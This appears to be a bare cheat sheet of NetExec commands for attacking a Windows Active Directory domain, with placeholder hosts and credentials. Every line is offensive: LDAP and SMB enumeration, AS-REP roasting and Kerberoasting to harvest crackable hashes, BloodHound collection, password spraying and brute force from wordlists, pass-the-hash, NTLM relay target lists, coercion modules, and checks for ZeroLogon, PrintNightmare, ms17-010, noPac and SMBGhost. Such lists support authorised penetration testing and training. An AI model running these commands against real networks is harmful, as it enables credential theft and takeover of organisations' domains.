netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dns-server "$DC_HOST" --bloodhound --collection All 
netexec smb "$RANGE" --gen-relay-list smb_targets.txt
netexec smb "$RANGE" --local-auth
netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --loggedon-users
netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --sessions
netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --shares
netexec smb "$RANGE" --shares
netexec smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
netexec smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
netexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_av
netexec smb "$TARGET" --pass-pol
netexec smb "$TARGET" -u "$USER" -p "$PASSWORD" -M coerce_plus -M ntlm_reflection -M nopac
netexec smb "$TARGET" -M ms17-010 -M printnightmare -M remove-mic -M smbghost -M zerologon
netexec smb "$TARGET" -M ioxidresolver
netexec smb "$TARGET" -u "$USER" -p "$PASSWORD" --shares
netexec smb "$TARGET" --generate-hosts-file hosts
netexec smb "$TARGET" --generate-krb5-file /tmp/krb5.conf && export KRB5_CONFIG=/tmp/krb5.conf
